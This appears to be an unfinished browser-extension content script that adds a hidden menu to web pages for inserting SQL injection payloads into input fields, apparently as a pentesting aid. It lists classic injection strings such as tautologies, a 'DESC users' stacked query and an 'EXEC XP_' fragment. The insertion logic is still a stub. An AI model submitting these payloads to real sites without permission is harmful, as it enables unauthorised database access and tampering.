//Create array of payloads to be added, these should be SQL payloads

const PAYLOAD_TYPES = ["Raw", "Encoded"];
const RAW_PAYOLADS = ["", "1 OR 1=1", "1\\' OR \\'1\\'=\\'1", "1\\'1", "1 EXEC XP_", "1 AND 1=1", "1\\' AND 1=(SELECT COUNT(*) FROM tablenames); --", "1 AND USER_NAME() = \\'dbo\\'", "\\\\\\'; DESC users; --"];

const ID_MENU = "menu_frame";

const HTML_UTILS = {
    hide: function (HTMLElement) {
        HTMLElement.style.display = "none";
    },
    show: function (HTMLElement) {
        HTMLElement.style.display = "block";
    },
    isVisible: function (HTMLElement) {
        return HTMLElement.style.display !== "none";
    },
    isNotNull: function (HTMLElement) {
        return null != HTMLElement;
    }
};

var lastInputPressed;

function main() {
    initializeMenuFrame();

    const inputs = document.getElementsByTagName("INPUT");
    for (let input of inputs) {
        if (input.tagName === "INPUT") {
            input.onclick = function () {
                lastInputPressed = this;

                let menu = document.getElementById(ID_MENU);

                if (HTML_UTILS.isNotNull(menu) && !HTML_UTILS.isVisible(menu)) HTML_UTILS.show(menu);
                else if (HTML_UTILS.isVisible(menu)) return;

                // TODO Select funct
                let listReference = menu.contentWindow.document.getElementById("payload_types");
                for (let payloadType of PAYLOAD_TYPES) {
                    let listElement = document.createElement("li");
                    listReference.appendChild(listElement);

                    let button = document.createElement("button");
                    listElement.appendChild(button);
                    button.innerHTML = payloadType;
                    button.onclick = openTypedPayloads(payloadType);
                }
            }
        }
    }
}

function openTypedPayloads(payloadType) {
    // TODO
}

function initializeMenuFrame() {
    let menu = document.createElement("iframe");
    menu.id = ID_MENU;
    menu.src = browser.extension.getURL("menu/menu.html");
    HTML_UTILS.hide(menu);

    if (null != document.getElementById(menu.id)) return;

    document.body.appendChild(menu);
}




//__________
main();
